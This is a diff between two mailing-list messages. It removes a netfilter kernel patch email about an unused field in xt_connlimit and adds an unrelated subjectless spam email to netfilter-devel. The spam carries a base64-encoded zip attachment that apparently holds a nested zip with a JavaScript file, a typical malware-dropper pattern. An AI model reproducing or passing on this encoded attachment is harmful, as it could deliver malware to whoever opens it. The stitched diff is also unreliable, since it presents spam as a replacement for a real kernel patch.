@@ -1,55 +1,68 @@
-From: Florian Westphal <fw@strlen.de>
-Subject: [PATCH nf-next] netfilter: xt_connlimit: don't store address in the conn nodes
-Date: Sun, 15 Oct 2017 11:00:34 +0200
-Message-ID: <20171015090034.6314-1-fw@strlen.de>
-Cc: Florian Westphal <fw@strlen.de>
+From: <edo.hlaca@ri.t-com.hr>
+Subject: (unknown)
+Date: Sun, 15 Oct 2017 11:49:15 -0000
+Message-ID: <150806815523.32756.5254040421618699290@biz.rr.com>
+Mime-Version: 1.0
+Content-Type: application/zip; name="808992881895551.zip"
+Content-Transfer-Encoding: base64
 To: <netfilter-devel@vger.kernel.org>
 Return-path: <netfilter-devel-owner@vger.kernel.org>
-Received: from Chamillionaire.breakpoint.cc ([146.0.238.67]:59750 "EHLO
-        Chamillionaire.breakpoint.cc" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1750829AbdJOJAU (ORCPT
-        <rfc822;netfilter-devel@vger.kernel.org>);
-        Sun, 15 Oct 2017 05:00:20 -0400
+Received: from rrcs-147-0-106-10.central.biz.rr.com ([147.0.106.10]:39981 "HELO
+        biz.rr.com" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750854AbdJOLtR (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
+        Sun, 15 Oct 2017 07:49:17 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netfilter-devel-owner@vger.kernel.org
 List-ID: <netfilter-devel.vger.kernel.org>
 
-Only stored, never read.  This is a leftover from commit 7d08487777c8
-("netfilter: connlimit: use rbtree for per-host conntrack obj storage"),
-which added the rbtree node struct that stores the address instead.
-
-Signed-off-by: Florian Westphal <fw@strlen.de>
----
- net/netfilter/xt_connlimit.c | 3 ---
- 1 file changed, 3 deletions(-)
-
-diff --git a/net/netfilter/xt_connlimit.c b/net/netfilter/xt_connlimit.c
-index ffa8eec980e9..ce2870428631 100644
---- a/net/netfilter/xt_connlimit.c
-+++ b/net/netfilter/xt_connlimit.c
-@@ -46,7 +46,6 @@
- struct xt_connlimit_conn {
- 	struct hlist_node		node;
- 	struct nf_conntrack_tuple	tuple;
--	union nf_inet_addr		addr;
- };
- 
- struct xt_connlimit_rb {
-@@ -125,7 +124,6 @@ static bool add_hlist(struct hlist_head *head,
- 	if (conn == NULL)
- 		return false;
- 	conn->tuple = *tuple;
--	conn->addr = *addr;
- 	hlist_add_head(&conn->node, head);
- 	return true;
- }
-@@ -270,7 +268,6 @@ count_tree(struct net *net, struct rb_root *root,
- 	}
- 
- 	conn->tuple = *tuple;
--	conn->addr = *addr;
- 	rbconn->addr = *addr;
- 
- 	INIT_HLIST_HEAD(&rbconn->hhead);
--- 
-2.13.6
-
+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
+fgoAAAAA
